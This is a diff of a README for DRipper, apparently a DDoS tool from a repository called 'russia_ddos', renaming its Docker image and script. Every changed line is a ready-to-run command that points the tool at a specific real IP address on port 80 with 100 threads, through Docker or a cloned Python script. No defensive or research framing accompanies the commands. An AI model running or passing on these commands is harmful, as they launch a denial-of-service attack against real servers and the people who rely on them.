@@ -7,7 +7,7 @@ This is an optimized version of DRipper. Here is original code: https://gist.git
 1. Docker
 
 ```bash
-docker run -ti --rm alexmon1989/dripper2:latest -s 213.24.76.23 -p 80 -t 100
+docker run -ti --rm alexmon1989/dripper:latest -s 213.24.76.23 -p 80 -t 100
 ```
 
 2. Directly with Python.
@@ -25,7 +25,7 @@ git clone https://github.com/alexmon1989/russia_ddos.git
 cd russia_ddos
 
 # run
-python -u DRipper2.py -s 213.24.76.23 -p 80 -t 100
+python -u DRipper.py -s 213.24.76.23 -p 80 -t 100
 # OR
-python3 -u DRipper2.py -s 213.24.76.23 -p 80 -t 100
+python3 -u DRipper.py -s 213.24.76.23 -p 80 -t 100
 ```
